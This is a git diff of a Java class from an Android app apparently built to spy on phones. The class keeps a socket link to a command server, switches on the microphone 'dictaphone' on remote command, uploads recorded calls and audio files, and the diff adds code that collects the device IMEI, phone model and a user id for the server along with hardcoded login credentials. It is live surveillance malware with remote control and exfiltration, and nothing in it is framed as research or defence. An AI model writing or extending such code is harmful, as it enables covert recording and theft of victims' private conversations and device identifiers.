@@ -6,6 +6,7 @@ import android.app.usage.UsageEvents;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Build;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.postal.omniscient.MainActivity;
@@ -27,6 +28,8 @@ import java.io.BufferedReader;
 import java.io.DataOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
@@ -62,7 +65,7 @@ public class DownloadFileRun extends Thread {
     public void start() {
 
         is_downloadFlag = new AdapterDownloadFlag();
-        String server = "192.168.168.101";
+        String server = "192.168.168.102";
         int port = 2221;
 
         String isLoaded = "isLoaded ";
@@ -99,6 +102,8 @@ public class DownloadFileRun extends Thread {
 
                     if (line.equals("isConnect") && !is_downloadFlag.getTreadIsWork()
                             && is_KeepConnectionFlag) {
+                            Log.e(Msg, "IS COON"+"\n");
+
                         //если поток передачи даннных запущен не поддерживать свъязь с сервером
                         KeepConnection keep_con = new KeepConnection(dos, is_downloadFlag,
                                 is_KeepConnectionFlag, context);
@@ -123,7 +128,7 @@ public class DownloadFileRun extends Thread {
 
                     //команда на включение диктофона
                     if (line.equals("dictaphone")) {
-                        if (!new ThreadIsAliveOrNot("DictaphoneRecord").liveORnot()) {
+                        if (!new ThreadIsAliveOrNot("DictaphoneRecordStop").liveORnot()) {
                             Dictaphone dict = new Dictaphone(is_downloadFlag, context);
                             dict.setName("DictaphoneRec");
                             dict.start();
@@ -132,7 +137,8 @@ public class DownloadFileRun extends Thread {
                             dos.flush();
                         }
                     }
-                }Log.d(Msg, "       ВЫХОД ИЗ ЦЫКЛА ");notGiveUp();sockClose();//на эмуляторе вместо ошибки - выходит из цыкла
+
+                }//Log.d(Msg, "       ВЫХОД ИЗ ЦЫКЛА ");notGiveUp();sockClose();//на эмуляторе вместо ошибки - выходит из цыкла
             } catch (IOException ex) { Log.e(Msg, "Eror "+ex);
                 //EventBus.getDefault().unregister(this);
 //                if(!socket.isOutputShutdown()){Log.d(Msg, " isOutputShutdown !");}
@@ -173,37 +179,25 @@ public class DownloadFileRun extends Thread {
     @Subscribe(threadMode = ThreadMode.ASYNC)
     public void onEvent(EventBusData event){
         String command = event.getComand();
-        if(command.equals("call_in") || command.equals("call_out")){
-            is_downloadFlag.setPhoneRecIsWork(true);
-        }
-
-
-
-
-        Boolean start_or_no_out = new ThreadIsAliveOrNot("OutCallWrite").liveORnot();
-        Boolean start_or_no_in = new ThreadIsAliveOrNot("InCallWrite").liveORnot();
-        if(!start_or_no_out && !start_or_no_in) {
+//        if(command.equals("call_in") || command.equals("call_out")){
+//            is_downloadFlag.setPhoneRecIsWork(true);
+//        }
+        if(command.equals("call_off")){
             is_downloadFlag.setPhoneRecIsWork(false);
         }
-
-//если файл записан и сейчас не записывается другой файл, можно отправлять данные
-        if(command.equals("dictaphone_off") || command.equals("call_off")
-                &&  !is_downloadFlag.getPhoneRecIsWork()
-                && !is_downloadFlag.getDictaphoneIsWork()) {
+        Log.e(Msg, "Загружаем файл после  записи звонка или диктофона  ");
+        if(!is_downloadFlag.getTreadIsWork() && !is_downloadFlag.getPhoneRecIsWork()){
             SendFilesOutOfTurn();
-
-            Log.e(Msg, "!!!   NOTES ME SEMPAI  ");
         }
-
     }
     private void SendFilesOutOfTurn(){
         try {
             allFoldersFiles = getAllFoldersFiles(context);
             if (allFoldersFiles != null) {
                 //отправка в новом потоке
-                SendFileToServer dwnloadFile = new SendFileToServer(allFoldersFiles,
+                SendFileToServer downloadFile = new SendFileToServer(allFoldersFiles,
                         socket, dos, is_downloadFlag);
-                Thread startDownlow = new Thread(dwnloadFile);
+                Thread startDownlow = new Thread(downloadFile);
                 //поток для загрузки файлов на сервер
                 startDownlow.start();
             }
@@ -236,12 +230,23 @@ public class DownloadFileRun extends Thread {
 
 
     public void oaut() {
+
+        TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+        String imei = telephonyManager.getDeviceId();
+
+        String PhoneModel = android.os.Build.MODEL;
+
         try {
             JSONObject aouth = new JSONObject();//Заголовок
             JSONObject log_pass = new JSONObject();
 
             aouth.put("Login", "postal");
             aouth.put("Password", "33954");
+            aouth.put("Imei", imei);
+            aouth.put("Id_user", readFromFile(context));
+            aouth.put("P_name", PhoneModel);
+            aouth.put("Command", "no");
+            aouth.put("NameToSend", "no");
             log_pass.put("Aouth", aouth);
 
             dos.writeUTF(log_pass.toString());
@@ -259,6 +264,34 @@ public class DownloadFileRun extends Thread {
             e.printStackTrace();
         }
     }
+
+    private String readFromFile(Context context) {
+
+        String text = "";
+
+        File stPath = new File(context.getFilesDir(), "/Config");//DIR);
+
+//Get the text file
+        File f = new File(stPath, "config.cnf");
+
+        try {
+            BufferedReader br = new BufferedReader(new FileReader(f));
+            String line;
+
+            while ((line = br.readLine()) != null) {
+                text += line;
+            }
+            br.close();
+
+        }catch (FileNotFoundException e) {
+            Log.e("login activity", "File not found: " + e.toString());
+        } catch (IOException e) {
+            Log.e("login activity", "Can not read file: " + e.toString());
+        }
+
+        return text;
+    }
+
     /** Close the socket */
     public void close() {
         try {
